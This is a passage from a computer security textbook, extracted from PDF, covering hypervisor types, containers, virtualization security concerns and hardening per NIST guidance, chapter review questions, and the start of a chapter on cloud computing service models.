virtualization, a \\r\\nnumber of which we will discuss further.\\r\\nVirtualization Alternatives\\r\\nThe hypervisor is software that sits between the hardware and the VMs and acts as \\r\\na resource broker. Simply put, it allows multiple VMs to safely coexist on a single \\r\\nphysical server host and share that host’s resources. The virtualizing software provides \\r\\nabstraction of all physical resources (such as processor, memory, network, and stor\\ufffeage) and thus enables multiple computing stacks, called virtual machines, to be run \\r\\non a single physical host.\\r\\nEach VM includes an OS, called the guest OS. This OS may be the same as the \\r\\nhost OS, if present, or a different one. For example, a guest Windows OS could be run \\r\\nin a VM on top of a Linux host OS. The guest OS, in turn, supports a set of standard \\r\\nlibrary functions and other binary files and applications. From the point of view of the \\r\\napplications and the user, this stack appears as an actual machine, with hardware and \\r\\nan OS; thus the term virtual machine is appropriate. In other words, it is the hardware \\r\\nthat is being virtualized.\\r\\nThe principal functions performed by a hypervisor are the following:\\r\\n• Execution management of VMs: Includes scheduling VMs for execution, virtual \\r\\nmemory management to ensure VM isolation from other VMs, and context \\r\\nswitching between various processor states. Also includes isolation of VMs \\r\\nto prevent conflicts in resource usage and emulation of timer and interrupt \\r\\nmechanisms.\\r\\n• Devices emulation and access control: Emulating all network and storage \\r\\n(block) devices that different native drivers in VMs are expecting, and mediat\\ufffeing access to physical devices by different VMs.\\r\\n• Execution of privileged operations by hypervisor for guest VMs: Certain opera\\ufffetions invoked by guest OSs, instead of being executed directly by the host hard\\ufffeware, may have to be executed on its behalf by the hypervisor, because of their \\r\\nprivileged nature.\\r\\n• Management of VMs (also called VM lifecycle management): Configuring guest \\r\\nVMs and controlling VM states (e.g., Start, Pause, Stop). \\r\\n• Administration of hypervisor platform and hypervisor software: Involves set\\ufffeting of parameters for user interactions with the hypervisor host as well as \\r\\nhypervisor software.\\r\\nM12_STAL0611_04_GE_C12.indd 436 10/11/17 3:02 PM\\n\\n\\n12.8 / VIRTUALIZATION SECURITY 437\\r\\nTYPE 1 HYPERVISOR There are two types of hypervisors, distinguished by whether \\r\\nthere is an OS between the hypervisor and the host. A type 1 hypervisor (see \\r\\nFigure 12.2a) is loaded as a software layer directly onto a physical server, much like \\r\\nan OS is loaded; this is referred to as native virtualization. The type 1 hypervisor can \\r\\ndirectly control the physical resources of the host. Once it is installed and configured, \\r\\nthe server is then capable of supporting virtual machines as guests. In mature envi\\uffferonments, where virtualization hosts are clustered together for increased availability \\r\\nand load balancing, a hypervisor can be staged on a new host. Then, that new host \\r\\nis joined to an existing cluster, and VMs can be moved to the new host without any \\r\\ninterruption of service.\\r\\nTYPE 2 HYPERVISOR A type 2 hypervisor exploits the resources and functions of a \\r\\nhost OS and runs as a software module on top of the OS (see Figure 12.2b); this is \\r\\nreferred to as hosted virtualization. It relies on the OS to handle all of the hardware \\r\\ninteractions on the hypervisor’s behalf.\\r\\nKey differences between the two hypervisor types are as follows:\\r\\n• Typically, type 1 hypervisors perform better than type 2 hypervisors. Because \\r\\na Type 1 hypervisor doesn’t compete for resources with an OS, there are more \\r\\nresources available on the host, and by extension, more virtual machines can be \\r\\nhosted on a virtualization server using a Type 1 hypervisor.\\r\\n• Type 1 hypervisors are also considered to be more secure than the Type 2 hyper\\ufffevisors. Virtual machines on a Type 1 hypervisor make resource requests that \\r\\nare handled external to that guest, and they cannot affect other VMs or the \\r\\nFigure 12.2 Comparison of Virtual Machines and Containers\\r\\n(a) Type 1 hypervisor\\r\\n(native virtualization)\\r\\nHardware\\r\\nHypervisor\\r\\nGuest OS Guest OS\\r\\nlibraries\\r\\nVirtual machine\\r\\nlibraries\\r\\nApp App App App\\r\\nHardware\\r\\nContainer Engine\\r\\nHost OS\\r\\nlibraries libraries\\r\\nApp App App App\\r\\n(c) Container (application virtualization)\\r\\n(b) Type 2 hypervisor\\r\\n(hosted virtualization)\\r\\nHardware\\r\\nHypervisor\\r\\nHost OS\\r\\nGuest OS Guest OS\\r\\nlibraries\\r\\nVirtual machine\\r\\nlibraries\\r\\nApp App App App\\r\\nContainer\\r\\nContainer\\r\\nM12_STAL0611_04_GE_C12.indd 437 10/11/17 3:02 PM\\n\\n\\n438 CHAPTER 12 / OPERATING SYSTEM SECURITY\\r\\nhypervisor they are supported by. This is not necessarily true for VMs on a Type \\r\\n2 hypervisor and a malicious guest could potentially affect more than itself.\\r\\n• Type 2 hypervisors allow a user to take advantage of virtualization without \\r\\nneeding to dedicate a server to only that function. Developers who need to \\r\\nrun multiple environments as part of their process, in addition to taking advan\\ufffetage of the personal productive workspace that a PC OS provides, can do both \\r\\nwith a type 2 hypervisor installed as an application on their LINUX, MacOSX, \\r\\nor Windows desktop. The virtual machines that are created and used can be \\r\\nmigrated or copied from one hypervisor environment to another, reducing \\r\\ndeployment time and increasing the accuracy of what is deployed, and reduc\\ufffeing the time to market a project.\\r\\nNative virtualization systems are typically seen in servers, with the goal of \\r\\nimproving the execution efficiency of the hardware. They are arguably also more \\r\\nsecure, as they have fewer additional layers than the alternative hosted approach. \\r\\nHosted virtualization systems are more common in clients, where they run alongside \\r\\nother applications on the host OS, and are used to support applications for alternate \\r\\noperating system versions or types.\\r\\nIn virtualized systems, the available hardware resources must be appropriately \\r\\nshared among the various guest OS’s. These include CPU, memory, disk, network, \\r\\nand other attached devices. CPU and memory are generally partitioned between \\r\\nthese, and scheduled as required. Disk storage may be partitioned, with each guest \\r\\nhaving exclusive use of some disk resources. Alternatively, a “virtual disk” may be \\r\\ncreated for each guest, which appears to it as a physical disk with a full file-system, \\r\\nbut is viewed externally as a single “disk image” file on the underlying file-system. \\r\\nAttached devices such as optical disks, or USB devices are generally allocated to a \\r\\nsingle guest OS at a time.\\r\\nSeveral alternatives exist for providing network access. The guest OS may have \\r\\ndirect access to distinct network interface cards on the system; the hypervisor may \\r\\nmediate access to shared interfaces; or the hypervisor may implement virtual network \\r\\ninterface cards for each guest, bridging or routing traffic between guests as required. \\r\\nThis last approach uses one or more virtual network switches, which are imple\\ufffemented in the hypervisor kernel, and is quite common. It is arguably the most effi\\ufffecient approach, since traffic between guests does not need to be relayed via external \\r\\nnetwork links. It does have security consequences in that this traffic is not subject to \\r\\nmonitoring by probes attached to physical networks, such as we discussed in Chapter 9.\\r\\nWhen a number virtualized systems and hypervisors are grouped together in \\r\\na data center, or even between data centers, the various systems need to connect \\r\\nto appropriate network segments, with suitable routing and firewalls connecting \\r\\nthem together, and to the Internet. The cloud computing solutions we will discuss in \\r\\nChapter 13 use this structure, as do computing solutions for some large organizations. \\r\\nThe network connections can be made with physical, external, links, using IDS and \\r\\nfirewalls to link them together as we discussed in Chapters 8 and 9. However this \\r\\napproach limits the flexibility of the virtualized solution, as virtual machines can only \\r\\nbe migrated to other hosts with the required physical network connections already \\r\\nin place. VLANs can provide more flexibility in the network architecture, though \\r\\nare still limited by the physical network connections and VLAN configuration. \\r\\nM12_STAL0611_04_GE_C12.indd 438 10/11/17 3:02 PM\\n\\n\\n12.8 / VIRTUALIZATION SECURITY 439\\r\\nGreater flexibility still is provided by software defined networks (SDNs), which \\r\\nenable network segments to logically span multiple servers within and between data \\r\\ncenters, while using the same underlying physical network. There are several pos\\ufffesible approaches to providing SDNs, including the use of overlay networks. These \\r\\nabstract all layer 2 and 3 addresses from the underlying physical network into what\\ufffeever logical network structure is required. And this structure can be easily changed \\r\\nand extended as needed. The IETF standard DOVE (Distributed Overlay Virtual \\r\\nNetwork), which uses VXLAN (Virtual Extended Local Area Network) can be used \\r\\nto implement such an overlay network. With this flexible structure, it is possible to \\r\\nlocate virtual servers, virtual IDS, and virtual firewalls anywhere within the network \\r\\nas required. We further discuss the use of secure virtual networks and firewalls later \\r\\nin this section.\\r\\nCONTAINERS A relatively recent approach to virtualization, known as container \\r\\nvirtualization or application virtualization, is worth noting (see Figure 12.2c). In this \\r\\napproach, software, known as a virtualization container, runs on top of the host OS \\r\\nkernel and provides an isolated execution environment for applications. Unlike hyper\\ufffevisor-based VMs, containers do not aim to emulate physical servers. Instead, all contain\\ufffeerized applications on a host share a common OS kernel. This eliminates the resources \\r\\nneeded to run a separate OS for each application and can greatly reduce overhead.\\r\\nFor containers, only a small container engine is required as support for the \\r\\ncontainers. The container engine sets up each container as an isolated instance by \\r\\nrequesting dedicated resources from the OS for each container. Each container app \\r\\nthen directly uses the resources of the host OS. VM virtualization functions at the \\r\\nborder of hardware and OS. It’s able to provide strong performance isolation and \\r\\nsecurity guarantees with the narrowed interface between VMs and hypervisors. \\r\\nContainerization, which sits in between the OS and applications, incurs lower over\\ufffehead, but potentially introduces greater security vulnerabilities.\\r\\nVirtualization Security Issues\\r\\n[CLEE09] and NIST SP 800-125 (Guide to Security for Full Virtualization Technolo\\ufffegies, January 2011) both detail a number of security concerns that result from the use \\r\\nof virtualized systems, including:\\r\\n• Guest OS isolation, ensuring that programs executing within a guest OS may \\r\\nonly access and use the resources allocated to it, and not covertly interact with \\r\\nprograms or data either in other guest OSs or in the hypervisor.\\r\\n• Guest OS monitoring by the hypervisor, which has privileged access to the pro\\ufffegrams and data in each guest OS, and must be trusted as secure from subversion \\r\\nand compromised use of this access.\\r\\n• Virtualized environment security, particularly image and snapshot manage\\ufffement, which attackers may attempt to view or modify.\\r\\nThese security concerns may be regarded as an extension of the concerns we have \\r\\nalready discussed with securing operating systems and applications. If a particular \\r\\noperating system and application configuration is vulnerable when running directly \\r\\non hardware in some context, it will most likely also be vulnerable when running \\r\\nM12_STAL0611_04_GE_C12.indd 439 10/11/17 3:02 PM\\r\\nhttps://sanet.st/blogs/polatebooks\\n\\n\\n440 CHAPTER 12 / OPERATING SYSTEM SECURITY\\r\\nin a virtualized environment. And should that system actually be compromised, \\r\\nit would be at least as capable of attacking other nearby systems, whether they \\r\\nare also executing directly on hardware or running as other guests in a virtual\\ufffeized environment. The use of a virtualized environment may improve security by \\r\\nfurther isolating network traffic between guests than would be the case when such \\r\\nsystems run natively, however this traffic is not visible to external IDS or firewall \\r\\nsystems, and may require the use of virtual firewalls to manage. Further the ability \\r\\nof the hypervisor to transparently monitor activity on all guests OS may be used as \\r\\na form of virtual firewall or IDS to assist in securing these systems. However, the \\r\\npresence of the virtualized environment and the hypervisor may reduce security \\r\\nif vulnerabilities exist within it which attackers may exploit. Such vulnerabilities \\r\\ncould allow programs executing in a guest to covertly access the hypervisor, and \\r\\nhence other guest OS resources. This is known as VM escape, and is of concern, as \\r\\nwe discussed in Section 6.8. Virtualized systems also often provide support for sus\\ufffepending an executing guest OS in a snapshot, saving that image, and then restarting \\r\\nexecution at a later time, possibly even on another system. If an attacker can view \\r\\nor modify this image, they can compromise the security of the data and programs \\r\\ncontained within it. The use of infrastructure with many virtualized systems within \\r\\nand between data centers, linked using software-defined networks, raise further \\r\\nsecurity concerns.\\r\\nThus, the use of virtualization adds additional layers of concern, as we have \\r\\npreviously noted. Securing virtualized systems means extending the security pro\\ufffecess to secure and harden these additional layers. In addition to securing each guest \\r\\noperating system and applications, the virtualized environment and the hypervisor \\r\\nmust also be secured.\\r\\nSecuring Virtualization Systems\\r\\nNIST SP 800-125 provides guidance for providing appropriate security in virtualized \\r\\nsystems, and states that organizations using virtualization should:\\r\\n• Carefully plan the security of the virtualized system.\\r\\n• Secure all elements of a full virtualization solution, including the hypervisor, \\r\\nguest OSs, and virtualized infrastructure, and maintain their security.\\r\\n• Ensure that the hypervisor is properly secured.\\r\\n• Restrict and protect administrator access to the virtualization solution.\\r\\nThis is clearly seen as an extension of the process of securing systems that we pre\\ufffesented earlier in this chapter.\\r\\nHYPERVISOR SECURITY The hypervisor should be secured using a process similar to \\r\\nthat with securing an operating system. That is, it should be installed in an isolated \\r\\nenvironment, from known clean media, and updated to the latest patch level in \\r\\norder to minimize the number of vulnerabilities that may be present. It should then \\r\\nbe configured so that it is updated automatically, any unused services are disabled \\r\\nor removed, unused hardware is disconnected, appropriate introspection capabili\\ufffeties are used with the guest OSs, and the hypervisor is monitored for any signs of \\r\\ncompromise.\\r\\nM12_STAL0611_04_GE_C12.indd 440 10/11/17 3:02 PM\\n\\n\\n12.8 / VIRTUALIZATION SECURITY 441\\r\\nAccess to the hypervisor should be limited to authorized administrators only, \\r\\nsince these users would be capable of accessing and monitoring activity in any of the \\r\\nguest OSs. The hypervisor may support both local and remote administration. This \\r\\nmust be configured appropriately, with suitable authentication and encryption mech\\ufffeanisms used, particularly when using remote administration. Remote administration \\r\\naccess should also be considered and secured in the design of any network firewall \\r\\nand IDS capability in use. Ideally such administration traffic should use a separate \\r\\nnetwork, with very limited, if any, access provided from outside the organization.\\r\\nVirtualized Infrastructure Security\\r\\nThe wider virtualization infrastructure must be carefully managed and configured. \\r\\nVirtualized system hypervisors manage access to hardware resources such as disk \\r\\nstorage and network interfaces. This access must be limited to just the appropriate \\r\\nguest OSs that use any resource, and network connections suitably arranged. Access \\r\\nto VM images and snapshots must also be carefully controlled, since these are another \\r\\npotential point of attack.\\r\\nWhen multiple virtualized systems are used, NIST SP 800-125B (Secure Virtual \\r\\nNetwork Configuration for Virtual Machine (VM) Protection, March 2016) notes three \\r\\ndistinct categories of network traffic:\\r\\n• Management traffic: used for hypervisor administration and configuration of \\r\\nthe virtualized infrastructure.\\r\\n• Infrastructure traffic: such as migration of VM images, or connections to net\\ufffework storage technologies.\\r\\n• Application traffic: between applications running VMs and to external net\\ufffeworks. This traffic may be further separated into a number of segments, isolat\\ufffeing traffic from applications with different sensitivity levels, or from different \\r\\norganizations or departments.\\r\\nTraffic in each of these should be suitably isolated and protected. This requires the \\r\\nuse of a number of network segments, connected as needed by appropriate firewall \\r\\nsystems. These may variously use a combination of distinct physical network connec\\ufffetions, VLANs, or software defined networks to provide a suitable network structure. \\r\\nFor example, in larger installations, management and infrastructure traffic may use \\r\\nrelatively static physical network connections, while the application traffic would \\r\\nuse more flexible VLANs or software defined networks layered over a separate base \\r\\nphysical network structure.\\r\\nVirtual Firewall\\r\\nAs we mentioned in Section 9.4, a Virtual Firewall provides firewall capabilities for \\r\\nthe network traffic flowing between systems hosted in a virtualized or cloud envi\\uffferonment that does not require this traffic to be routed out to a physically separate \\r\\nnetwork supporting traditional firewall services. These capabilities may be provided \\r\\nby a combination of:\\r\\n• VM Bastion Host: Where a separate VM is used as a bastion host supporting \\r\\nthe same firewall systems and services that could be configured to run on a \\r\\nM12_STAL0611_04_GE_C12.indd 441 10/11/17 3:02 PM\\n\\n\\n442 CHAPTER 12 / OPERATING SYSTEM SECURITY\\r\\nphysically separate bastion, including possibly IDS and IPS services. The net\\ufffework connections used by other VMs are configured to connect them to suitable \\r\\nsub-networks. These are connected to distinct virtual network interfaces on the \\r\\nVM Bastion Host, which can monitor and route traffic between them in the \\r\\nsame manner, and with the same configuration possibilities, as on a physically \\r\\nseparate bastion host. Such systems may be provided as a virtual UTM installed \\r\\ninto a suitably hardened VM that can be easily loaded, configured, and run as \\r\\nneeded. A disadvantage of this approach is that these virtual bastions compete \\r\\nfor the same hypervisor host resources as other VMs on that system.\\r\\n• VM Host-Based Firewall: Where host-based firewall capabilities provided by \\r\\nthe Guest OS running on the VM are configured to secure that host in the same \\r\\nmanner as used in physically separate systems.\\r\\n• Hypervisor Firewall: Where firewall capabilities are provided directly by the \\r\\nhypervisor. These capabilities range from stateless or stateful packet inspection \\r\\nin the virtual network switches that forward network traffic between VMs, to \\r\\na full hypervisor firewall capable of monitoring all activity within its VMs. This \\r\\nlatter variant provides capabilities of both host-based and bastion host firewalls, \\r\\nbut from a location outside the traditional host and network structure. It can \\r\\nbe more secure than the other alternatives, as it is not part of the virtualized \\r\\nnetwork, nor visible as a separate VM. It may also be more efficient than the \\r\\nalternatives, since the resource monitoring and filtering occur within the hyper\\ufffevisor kernel running directly on the hardware. However, it requires a hypervisor \\r\\nthat supports these features, which also adds to its complexity.\\r\\nWhen used in large-scale virtualized environments, with many virtualized systems \\r\\nlinked with VLANs or software defined networks across one or more data centers, \\r\\nvirtual firewall bastions can be provisioned and located as needed where suitable \\r\\nresources are available. This provides a greater level of flexibility and scalability \\r\\nthan many traditional structures can support. However, there may still be a need for \\r\\nsome physical firewall systems, especially to support very high traffic volumes either \\r\\nbetween virtual servers or on their connection to the wider Internet.\\r\\nHOSTED VIRTUALIZATION SECURITY Hosted virtualized systems, as typically used \\r\\non client systems, pose some additional security concerns. These result from the pres\\ufffeence of the host OS under, and other host applications beside, the hypervisor and \\r\\nits guest OSs. Hence there are yet more layers to secure. Further, the users of such \\r\\nsystems often have full access to configure the hypervisor, and to any VM images and \\r\\nsnapshots. In this case, the use of virtualization is more to provide additional features, \\r\\nand to support multiple operating systems and applications, than to isolate these \\r\\nsystems and data from each other, and from the users of these systems.\\r\\nIt is possible to design a host system and virtualization solution that is more \\r\\nprotected from access and modification by the users. This approach may be used to \\r\\nsupport well-secured guest OS images used to provide access to enterprise networks \\r\\nand data, and to support central administration and update of these images. However, \\r\\nthere will remain security concerns from possible compromise of the underlying host \\r\\nOS, unless it is adequately secured and managed.\\r\\nM12_STAL0611_04_GE_C12.indd 442 10/11/17 3:02 PM\\n\\n\\n12.9 / KEY TERMS, REVIEW QUESTIONS, AND PROBLEMS 443\\r\\nReview Questions\\r\\n12.1 What are the basic steps needed in the process of securing a system?\\r\\n12.2 What is “hardening”?\\r\\n12.3 What are the basic steps needed to secure the base operating system?\\r\\n12.4 Why is keeping all software as up to date as possible so important?\\r\\n12.5 What are the pros and cons of automated patching?\\r\\n12.6 Why is it better to not install software applications from unknown sources at all, \\r\\ninstead of installing them, perhaps testing them, and then removing or disabling them?\\r\\n12.7 What types of additional security controls may be used to secure the base operating \\r\\nsystem?\\r\\n12.8 What additional steps are used to secure key applications?\\r\\n12.9 What steps are used to maintain system security?\\r\\n12.10 Why is effective logging considered a cornerstone of sound security practice?\\r\\n12.11 What is the difference between a data backup and data archiving?\\r\\n12.12 Where is user account and group information stored in Unix systems?\\r\\n12.13 How does the Windows operating system provide patch management?\\r\\n12.14 What effect do set user and set group permissions have when executing files on Unix \\r\\nand Linux systems?\\r\\n12.15 What is the main host firewall program used on Linux systems?\\r\\n12.16 What is meant by a tripwire?\\r\\n12.17 How is a chroot jail used to improve application security on Unix and Linux systems?\\r\\n12.18 Where are two places user and group information may be stored on Windows systems?\\r\\n12.19 What are the major differences between the implementations of the discretionary \\r\\naccess control models on Unix and Linux systems and those on Windows systems?\\r\\n12.20 What are mandatory integrity controls used for in Windows systems?\\r\\n12.21 On Windows, which privilege overrides all ACL checks, and why?\\r\\n12.22 Where is application and service configuration information stored on Windows systems?\\r\\n12.23 What is a hypervisor?\\r\\n12.24 State different types of full virtualization with their security requirements.\\r\\nKey Terms\\r\\naccess controls\\r\\nadministrators\\r\\napplication virtualization\\r\\narchive\\r\\nbackup\\r\\nchroot\\r\\ncontainer virtualization\\r\\nfull virtualization\\r\\nguest OS\\r\\nhardening\\r\\nhosted virtualization\\r\\nhypervisor\\r\\nlogging\\r\\nnative virtualization\\r\\noverlay network\\r\\npatches\\r\\npatching\\r\\npermissions\\r\\nsoftware defined network\\r\\ntype 1 hypervisor\\r\\ntype 2 hypervisor\\r\\nvirtualization\\r\\n12.9 KEY TERMS, REVIEW QUESTIONS, AND PROBLEMS\\r\\nM12_STAL0611_04_GE_C12.indd 443 10/11/17 3:02 PM\\n\\n\\n444 CHAPTER 12 / OPERATING SYSTEM SECURITY\\r\\n12.25 What are the main security concerns with a hypervisor?\\r\\n12.26 What is VM escape and what are its implications?\\r\\nProblems\\r\\n12.1 Describe the main reason for not eliminating the setuid root programs completely \\r\\nfrom the operating systems.\\r\\n12.2 Set user (setuid) and set group (setgid) programs and scripts are a powerful mecha\\ufffenism provided by Unix to support “controlled invocation” to manage access to sensi\\ufffetive resources. However, precisely because of this it is a potential security hole, and \\r\\nbugs in such programs have led to many compromises on Unix systems. Detail a com\\ufffemand you could use to locate all set user or group scripts and programs on a Unix \\r\\nsystem, and how you might use this information.\\r\\n12.3 How can we use the TCP Wrappers and tcpd daemon to achieve secure remote con\\ufffetrol access? What if the network servers are heavily loaded?\\r\\n12.4 Employee “david” owns a directory, “exams,” containing a text file called “papers.\\r\\ntxt” that he shares with users belonging to the group “examiners.” Those users can \\r\\nnot only read and change this file, but also delete it. They can add other files to the \\r\\ndirectory. Others may neither read, write, nor execute anything in “examiners.” What \\r\\nwould appropriate ownerships and permissions for both the directory “examiners” \\r\\nand the file “papers.txt” look like? (Write your answers in the form of “long listing” \\r\\noutput.)\\r\\n12.5 Suppose you operate an Apache-based Linux Web server that hosts your company’s \\r\\ne-commerce site. Suppose further there is a worm called “WorminatorX,” which \\r\\nexploits a (fictional) buffer overflow bug in the Apache Web server package that can \\r\\nresult in a remote root compromise. Construct a simple threat model that describes \\r\\nthe risk this represents: attacker(s), attack-vector, vulnerability, assets, likelihood of \\r\\noccurrence, likely impact, and plausible mitigations.\\r\\n12.6 Why is it important to secure the boot process? Is it required to limit which media the \\r\\nsystem must boot from?\\r\\n12.7 Consider an automated audit log analysis tool (e.g., swatch). Can you propose some \\r\\nrules which could be used to distinguish “suspicious activities” from normal user \\r\\nbehavior on a system for some organization?\\r\\n12.8 Assume a hosted virtualization system in which a hypervisor executes and manages a \\r\\ntotal of six guest operating systems. Suppose an external hard disk is attached to the \\r\\nsystem and three guest operating systems need to access it for retrieving data. Will the \\r\\nattached hard disk be allocated to all the three guest operating systems at the same \\r\\ntime? Moreover, how will the hypervisor provide network access to the guest operat\\ufffeing systems if the total number of network interface cards attached to the system is \\r\\nnot enough?\\r\\n12.9 Some have argued that Unix/Linux systems reuse a small number of security fea\\ufffetures in many contexts across the system, while Windows systems provide a much \\r\\nlarger number of more specifically targeted security features used in the appropriate \\r\\ncontexts. This may be seen as a trade-off between simplicity and lack of flexibility in \\r\\nthe Unix/Linux approach, against a better targeted but more complex and harder to \\r\\ncorrectly configure approach in Windows. Discuss this trade-off as it impacts on the \\r\\nsecurity of these respective systems, and the load placed on administrators in manag\\ufffeing their security.\\r\\n12.10 It is recommended that while using a hypervisor, the access to the hypervisor should \\r\\nbe limited to authorized administrators only. Why?\\r\\nM12_STAL0611_04_GE_C12.indd 444 10/11/17 3:02 PM\\n\\n\\n445\\r\\n13.1 Cloud Computing\\r\\nCloud Computing Elements\\r\\nCloud Service Models\\r\\nCloud Deployment Models\\r\\nCloud Computing Reference Architecture\\r\\n13.2 Cloud Security Concepts\\r\\nSecurity Issues for Cloud Computing\\r\\nAddressing Cloud Computing Security Concerns\\r\\n13.3 Cloud Security Approaches\\r\\nRisks and Countermeasures\\r\\nData Protection in the Cloud\\r\\nSecurity Approaches for Cloud Computing Assets\\r\\nCloud Security as a Service\\r\\nAn Open-source Cloud Security Module\\r\\n13.4 The Internet of Things\\r\\nThings on the Internet of Things\\r\\nEvolution\\r\\nComponents of IoT-enabled Things\\r\\nIoT and Cloud Context\\r\\n13.5 IOT Security \\r\\nThe Patching Vulnerability\\r\\nIoT Security and Privacy Requirements Defined by ITU-T\\r\\nAn IoT Security Framework\\r\\nAn Open-source IoT Security Module\\r\\n13.6 Key Terms and Review Questions\\r\\nCloud and IoT Security\\r\\nCHAPTER \\r\\nM13_STAL0611_04_GE_C13.indd 445 10/11/17 3:08 PM\\n\\n\\n446 CHAPTER 13 / CLOUD AND IoT SECURITY\\r\\nThe two most significant developments in computing in recent years are cloud computing \\r\\nand the Internet of Things (IoT). In both cases, security measures tailored to the specific \\r\\nrequirements of these environments are evolving. This chapter begins with an overview \\r\\nof the concepts of cloud computing, followed by a discussion of cloud security. Then the \\r\\nchapter examines the concepts of IoT and closes with a discussion of IoT security.\\r\\nFor further detail on the material on cloud computing and IoT in Sections 13.1 \\r\\nand 13.4, see [STAL16a].\\r\\n13.1 CLOUD COMPUTING\\r\\nThere is an increasingly prominent trend in many organizations to move a substantial \\r\\nportion or even all information technology (IT) operations to an Internet-connected \\r\\ninfrastructure known as enterprise cloud computing. The use of cloud computing raises \\r\\na number of security issues, particularly in the area of database security. This section pro\\ufffevides an overview of cloud computing. Section 13.2 discussed cloud computing security.\\r\\nCloud Computing Elements\\r\\nNIST defines cloud computing, in NIST SP 800-145 (The NIST Definition of Cloud \\r\\nComputing, September 2011) as follows:\\r\\nLEARNING OBJECTIVES\\r\\nAfter studying this chapter, you should be able to:\\r\\n◆ Present an overview of cloud computing concepts.\\r\\n◆ List and define the principal cloud services.\\r\\n◆ List and define the cloud deployment models.\\r\\n◆ Explain the NIST cloud computing reference architecture.\\r\\n◆ Describe Cloud Security as a Service.\\r\\n◆ Understand the OpenStack security module for cloud security.\\r\\n◆ Explain the scope of the Internet of things.\\r\\n◆ List and discuss the five principal components of IoT-enabled things.\\r\\n◆ Understand the relationship between cloud computing and IoT.\\r\\n◆ Define the patching vulnerability.\\r\\n◆ Explain the IoT Security Framework.\\r\\n◆ Understand the MiniSec security feature for wireless sensor networks.\\r\\nCloud computing: A model for enabling ubiquitous, convenient, on-demand net\\ufffework access to a shared pool of configurable computing resources (e.g., networks, \\r\\nservers, storage, applications, and services) that can be rapidly provisioned and \\r\\nreleased with minimal management effort or service provider interaction. This \\r\\ncloud model promotes availability and is composed of five essential characteristics, \\r\\nthree service models, and four deployment models.\\r\\nM13_STAL0611_04_GE_C13.indd 446 10/11/17 3:08 PM\\n\\n\\n13.1 / CLOUD COMPUTING 447\\r\\nThe definition refers to various models and characteristics, whose relationship \\r\\nis illustrated in Figure 13.1. The essential characteristics of cloud computing includes \\r\\nthe following:\\r\\n• Broad network access: Capabilities are available over the network and accessed \\r\\nthrough standard mechanisms that promote use by heterogeneous thin or thick \\r\\nclient platforms (e.g., mobile phones, laptops, and tablets) as well as other tra\\ufffeditional or cloud-based software services.\\r\\n• Rapid elasticity: Cloud computing gives you the ability to expand and reduce \\r\\nresources according to your specific service requirement. For example, you may \\r\\nneed a large number of server resources for the duration of a specific task. You \\r\\ncan then release these resources upon completion of the task.\\r\\n• Measured service: Cloud systems automatically control and optimize resource \\r\\nuse by leveraging a metering capability at some level of abstraction appropri\\ufffeate to the type of service (e.g., storage, processing, bandwidth, and active user \\r\\naccounts). Resource usage can be monitored, controlled, and reported, provid\\ufffeing transparency for both the provider and consumer of the utilized service.\\r\\n• On-demand self-service: A cloud service consumer (CSC) can unilaterally \\r\\nprovision computing capabilities, such as server time and network storage, as \\r\\nneeded, automatically, without requiring human interaction with each service \\r\\nFigure 13.1 Cloud Computing Elements\\r\\nBroad\\r\\nNetwork Access\\r\\nResource Pooling\\r\\nRapid\\r\\nElasticity\\r\\nEssential\\r\\nCharacteristics\\r\\nService\\r\\nModels\\r\\nDeployment\\r\\nModels\\r\\nMeasured\\r\\nService\\r\\nOn-demand\\r\\nSelf-service\\r\\nPublic Private Hybrid Community\\r\\nSoftware as a Service (SaaS)\\r\\nPlatform as a Service (PaaS)\\r\\nInfrastructure as a Service (IaaS)\\r\\nM13_STAL0611_04_GE_C13.indd 447 10/11/17 3:08 PM\\n\\n\\n448 CHAPTER 13 / CLOUD AND IoT SECURITY\\r\\nprovider. Because the service is on demand, the resources are not permanent \\r\\nparts of the consumer’s IT infrastructure.\\r\\n• Resource pooling: The provider’s computing resources are pooled to serve \\r\\nmultiple CSCs using a multi-tenant model, with different physical and virtual \\r\\nresources dynamically assigned and reassigned according to consumer demand. \\r\\nThere is a degree of location independence in that the CSC generally has no \\r\\ncontrol or knowledge of the exact location of the provided resources, but may \\r\\nbe able to specify location at a higher level of abstraction (e.g., country, state, \\r\\nor data center). Examples of resources include storage, processing, memory, \\r\\nnetwork bandwidth, and virtual machines (VMs). Even private clouds tend to \\r\\npool resources between different parts of the same organization.\\r\\nCloud Service Models\\r\\nNIST SP 800-145 defines three service models, which can be viewed as nested service \\r\\nalternatives: Software as a service (SaaS), platform as a service (PaaS), and infrastruc\\ufffeture as a service (IaaS).\\r\\nSOFTWARE AS A SERVICE SaaS provides service to customers in the form of soft\\ufffeware, specifically application software, running on and accessible in the cloud. SaaS \\r\\nfollows the familiar model of Web services, in this case applied to cloud resources. \\r\\nSaaS enables the customer to use the cloud provider’s applications running on the \\r\\nprovider’s cloud infrastructure. The applications are accessible from various client \\r\\ndevices through a simple interface such as a Web browser. Instead of obtaining desk\\ufffetop and server licenses for software products it uses, an enterprise obtains the same \\r\\nfunctions from the cloud service. The use of SaaS avoids the complexity of software \\r\\ninstallation, maintenance, upgrades, and patches. Examples of services at this level \\r\\nare Google Gmail, Microsoft 365, Salesforce, Citrix GoToMeeting, and Cisco WebEx.\\r\\nCommon subscribers to SaaS are organizations that want to provide their \\r\\nemployees with access to typical office productivity software, such as document \\r\\nmanagement and e-mail. Individuals also commonly use the SaaS model to acquire \\r\\ncloud resources. Typically, subscribers use specific applications on demand. The cloud \\r\\nprovider also usually offers data-related features such as automatic backup and data \\r\\nsharing between subscribers.\\r\\nPLATFORM AS A SERVICE A PaaS cloud provides service to customers in the form of \\r\\na platform on which the customer’s applications can run. PaaS enables the customer \\r\\nto deploy onto the cloud infrastructure customer-created or -acquired applications. \\r\\nA PaaS cloud provides useful software building blocks, plus a number of development \\r\\ntools, such as programming language tools, run-time environments, and other tools \\r\\nthat assist in deploying new applications. In effect, PaaS is an operating system in the \\r\\ncloud. PaaS is useful for an organization that wants to develop new or tailored applica\\ufffetions while paying for the needed computing resources only as needed and only for as \\r\\nlong as needed. AppEngine, Engine Yard, Heroku, Microsoft Azure, Force.com, and \\r\\nApache Stratos are examples of PaaS.\\r\\nINFRASTRUCTURE AS A SERVICE With IaaS, the customer has access to the resources \\r\\nof the underlying cloud infrastructure. The cloud service user does not manage or \\r\\ncontrol the resources of the underlying cloud infrastructure but has control over \\r\\nM13_STAL0611_04_GE_C13.indd 448 10/11/17 3:08 PM\\n\\n\\n13.1 / CLOUD COMPUTING 449\\r\\noperating systems, deployed applications, and possibly limited control of select \\r\\nnetworking components (e.g., host firewalls). IaaS provides VMs and other virtual\\ufffeized hardware 